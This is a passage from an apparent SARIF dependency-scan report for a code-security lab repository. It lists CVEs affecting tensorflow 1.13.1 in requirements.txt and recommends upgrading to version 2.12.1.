            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29556 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29556](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29556)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "19dac598371f411af2c7e4df65abcdf556c4a831"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29587",
          "ruleIndex": 175,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29587 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29587](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29587)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0e1ddaeb3d74e4b7605e73b528ec18a35a255034"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29537",
          "ruleIndex": 176,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29537 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29537](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29537)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fb567fcd3ca2dd6206a2364526fb92b4e98fea15"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37687",
          "ruleIndex": 177,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37687 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37687)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d24b57e7cb37e304d7d9626960835f8978b188d3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37636",
          "ruleIndex": 178,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37636 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37636](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37636)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a76e4b77efcacef4fa7b2efa599ee037b98fce27"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37683",
          "ruleIndex": 179,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37683 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37683](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37683)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "80a372116824fcafad2679d49d9b1e1f0ac28470"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37653",
          "ruleIndex": 180,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37653 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37653](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37653)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0777b3c0894630eac7da6afb466ab3b9c10c65ce"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37665",
          "ruleIndex": 181,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37665 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37665)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "684307584a39db30317a191b5c9addc89f0961da"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37657",
          "ruleIndex": 182,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37657 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37657](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37657)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0285b02531dd6a71de85d22d6d7dc11777c8c2a9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37678",
          "ruleIndex": 183,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37678 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37678](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37678)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0f9af3e98ca61cf4963238c466cccf0ab5cc85a0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37690",
          "ruleIndex": 184,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37690 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37690](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37690)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "25f7321661f41818dc97c446b2c6cc8607abbe49"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37663",
          "ruleIndex": 185,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37663 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37663](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37663)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "20d9f6e9048ebc27cccf889461316975a00c43ad"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37664",
          "ruleIndex": 186,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37664 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37664)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4dac92d6d0a95654727777e1d80be53e8a719248"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37667",
          "ruleIndex": 187,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37667 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37667](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37667)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "80cfa1d3e6934ec761b69cc0a7884fc7a5b5d466"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37638",
          "ruleIndex": 188,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37638 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37638)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5f005e2021be9e24c5396b3ec282c68d85c86815"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37647",
          "ruleIndex": 189,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37647 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37647](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37647)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7f2609b3e1c15d67d01e125cf8dd02baae93183c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37658",
          "ruleIndex": 190,
          "level": "warning",
          "message": {
